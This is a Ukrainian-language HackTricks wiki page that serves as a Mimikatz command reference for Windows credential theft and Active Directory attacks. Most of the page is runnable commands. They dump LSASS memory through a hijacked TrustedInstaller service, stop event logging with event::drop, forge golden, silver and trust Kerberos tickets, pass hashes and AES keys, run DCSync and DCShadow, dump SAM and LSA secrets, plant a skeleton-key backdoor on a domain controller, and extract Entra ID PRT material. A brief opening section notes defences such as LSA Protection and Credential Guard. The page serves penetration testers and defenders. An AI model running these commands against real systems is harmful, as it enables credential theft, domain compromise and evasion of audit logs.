# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**Ця сторінка базується на матеріалах [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Перегляньте оригінал для отримання додаткової інформації!<sup>[[3]](#references)</sup>

## LM і Clear-Text у пам’яті

Починаючи з Windows 8.1 і Windows Server 2012 R2, було впроваджено значні заходи для захисту від крадіжки облікових даних:

- **LM-хеші та паролі у відкритому тексті** більше не зберігаються в пам’яті для підвищення безпеки. Певний параметр реєстру _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ має бути налаштований зі значенням DWORD `0`, щоб вимкнути Digest Authentication і забезпечити, щоб паролі у "clear-text" не кешувалися в LSASS.

- **LSA Protection** запроваджено для захисту процесу Local Security Authority (LSA) від несанкціонованого читання пам’яті та ін’єкції коду. Це досягається позначенням LSASS як захищеного процесу. Активація LSA Protection передбачає:
1. Зміну реєстру за адресою _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ шляхом встановлення `RunAsPPL` у значення `dword:00000001`.
2. Впровадження Group Policy Object (GPO), який забезпечує застосування цієї зміни реєстру на всіх керованих пристроях.

Попри ці засоби захисту, такі інструменти, як Mimikatz, можуть обійти LSA Protection за допомогою спеціальних драйверів, хоча такі дії, ймовірно, будуть зафіксовані в журналах подій.

На сучасних робочих станціях це має ще більше значення, оскільки **Credential Guard увімкнено за замовчуванням у багатьох системах Windows 11 22H2+ і Windows Server 2025, приєднаних до домену та не використовуваних як DC**, тоді як **LSASS-as-PPL увімкнено за замовчуванням у нових інсталяціях Windows 11 22H2+**. На практиці це означає, що `sekurlsa::logonpasswords` часто повертає менше матеріалу, ніж очікувалося за старими tradecraft-підходами, і оператори дедалі частіше переходять до **offline minidumps**, **видобування ключів Kerberos (`sekurlsa::ekeys`)** або модулів, орієнтованих на **CloudAP/PRT**. Щодо захисту див. [захист облікових даних Windows](credentials-protections.md).

### Протидія видаленню SeDebugPrivilege

Адміністратори зазвичай мають SeDebugPrivilege, що дає їм змогу налагоджувати програми. Цей привілей можна обмежити, щоб запобігти несанкціонованому створенню дампів пам’яті — поширеній техніці, яку зловмисники використовують для вилучення облікових даних із пам’яті. Однак навіть після видалення цього привілею обліковий запис TrustedInstaller усе ще може створювати дампи пам’яті за допомогою налаштованої конфігурації служби:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Це дозволяє зберегти пам’ять `lsass.exe` у файл, який потім можна проаналізувати в іншій системі для вилучення облікових даних:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz Options

Підробка журналів подій у Mimikatz передбачає дві основні дії: очищення журналів подій і patching служби Event для запобігання запису нових подій. Нижче наведено команди для виконання цих дій:

#### Очищення журналів подій

- **Command**: Ця дія призначена для видалення журналів подій, що ускладнює відстеження шкідливої активності.
- Mimikatz не надає прямої команди у стандартній документації для очищення журналів подій безпосередньо через командний рядок. Однак маніпуляції з журналами подій зазвичай передбачають використання системних інструментів або скриптів поза Mimikatz для очищення певних журналів (наприклад, за допомогою PowerShell або Windows Event Viewer).

#### Експериментальна функція: Patching служби Event

- **Command**: `event::drop`
- Ця експериментальна команда призначена для зміни поведінки Event Logging Service, фактично запобігаючи запису нових подій.
- Приклад: `mimikatz "privilege::debug" "event::drop" exit`

- Команда `privilege::debug` забезпечує роботу Mimikatz із необхідними привілеями для модифікації системних служб.
- Потім команда `event::drop` patching-ить Event Logging service.

### Атаки на Kerberos Tickets

Використовуйте наведені нижче команди як короткі нагадування щодо синтаксису. На спеціальних сторінках про [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md) і [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) містяться актуальні нюанси AES/PAC/opsec.

### Створення Golden Ticket

Golden Ticket забезпечує impersonation доступу на рівні домену. Основна команда та параметри:

- Command: `kerberos::golden`
- Parameters:
- `/domain`: Назва домену.
- `/sid`: Security Identifier (SID) домену.
- `/user`: Ім'я користувача, якого потрібно impersonate.
- `/krbtgt`: NTLM hash облікового запису служби KDC домену.
- `/ptt`: Безпосередньо inject-ить ticket у пам'ять.
- `/ticket`: Зберігає ticket для подальшого використання.

Приклад:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Silver Ticket Creation

Silver Tickets надають доступ до певних services. Основні command і parameters:

- Command: Подібний до Golden Ticket, але націлений на певні services.
- Parameters:
- `/service`: Service, на який спрямовано атаку (наприклад, cifs, http).
- Інші parameters, подібні до Golden Ticket.

Example:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Створення Trust Ticket

Trust Tickets використовуються для доступу до ресурсів у різних доменах через використання trust relationships. Основні command і parameters:

- Command: Аналогічний Golden Ticket, але для trust relationships.
- Parameters:
- `/target`: FQDN цільового домену.
- `/rc4`: NTLM hash облікового запису trust.

Example:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Додаткові команди Kerberos

- **Listing Tickets**:

- Command: `kerberos::list`
- Виводить список усіх Kerberos tickets для поточної user session.

- **Pass the Cache**:

- Command: `kerberos::ptc`
- Інжектить Kerberos tickets із cache files.
- Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pass the Ticket**:

- Command: `kerberos::ptt`
- Дозволяє використовувати Kerberos ticket в іншій session.
- Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Purge Tickets**:
- Command: `kerberos::purge`
- Очищає всі Kerberos tickets із session.
- Корисно виконати перед використанням команд для маніпуляції tickets, щоб уникнути конфліктів.

### Over-Pass-the-Hash / Pass-the-Key

Якщо `RC4` вимкнено або він працює ненадійно, Mimikatz може підмінити **AES128/AES256 Kerberos keys** у поточній logon session замість використання лише NT hash. Зазвичай це краще підходить для сучасних доменів, ніж розглядати `sekurlsa::pth` виключно як NTLM-only.<sup>[[1]](#references)</sup>
```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```
`/impersonate` повторно використовує поточний процес замість запуску нової консолі, що зручно, коли потрібно одразу виконати такі команди, як `lsadump::dcsync`, у тому самому контексті.

### Втручання в Active Directory

- **DCShadow**: Тимчасово змусити машину діяти як DC для маніпуляцій з об’єктами AD. Див. [DCShadow](../active-directory-methodology/dcshadow.md).

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Імітувати DC для запиту даних паролів. Див. [DCSync](../active-directory-methodology/dcsync.md).
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Доступ до облікових даних

- **LSADUMP::LSA**: Витягнути облікові дані з LSA.

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Імітувати DC, використовуючи дані пароля облікового запису комп’ютера.

- _У початковому контексті конкретну команду для NetSync не наведено._

- **LSADUMP::SAM**: Отримати доступ до локальної бази даних SAM.

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Розшифрувати секрети, збережені в реєстрі.

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Встановити новий NTLM hash для користувача.

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Отримати автентифікаційні дані про trust.
- `mimikatz "lsadump::trust" exit`

### Хмарні облікові дані / Entra ID

На хостах із **Entra ID** або **hybrid-joined** `sekurlsa::cloudap` може розкрити матеріал кешованого **Primary Refresh Token (PRT)** з LSASS. Якщо пов’язаний ключ Proof-of-Possession захищений програмними засобами, `dpapi::cloudapkd` може отримати відкритий/похідний матеріал ключа, необхідний для подальших робочих процесів **Pass-the-PRT**.<sup>[[1]](#references)</sup>
```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" exit
mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```
Це стає значно складнішим, коли ключ захищений TPM, але це варто перевірити на hybrid endpoints, оскільки кешовані дані CloudAP можуть бути цікавішими за класичний результат `wdigest`.<sup>[[2]](#references)</sup> Щодо cloud-side abuse chain див. [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html).

### Різне

- **MISC::Skeleton**: Інжектити backdoor у LSASS на DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Підвищення привілеїв

- **PRIVILEGE::Backup**: Отримати права резервного копіювання.

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Отримати debug-привілеї.
- `mimikatz "privilege::debug" exit`

### Credential Dumping

- **SEKURLSA::LogonPasswords**: Показати облікові дані користувачів, які виконали вхід.

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Витягнути Kerberos-квитки з пам’яті.
- `mimikatz "sekurlsa::tickets /export" exit`

### Маніпуляції SID і токенами

- **SID::add/modify**: Змінити SID і SIDHistory.

- Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modify: _У початковому контексті немає конкретної команди для modify._

- **TOKEN::Elevate**: Імітувати токени.
- `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: Дозволити кілька RDP-сеансів.

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Перелічити сеанси TS/RDP.
- _У початковому контексті для TS::Sessions не наведено конкретної команди._

### Vault

- Витягнути паролі з Windows Vault.
- `mimikatz "vault::cred /patch" exit`


## References

- [1] [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
- [2] [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
- [3] [Mimikatz command reference](https://adsecurity.org/?page_id=1821)

{{#include ../../banners/hacktricks-training.md}}
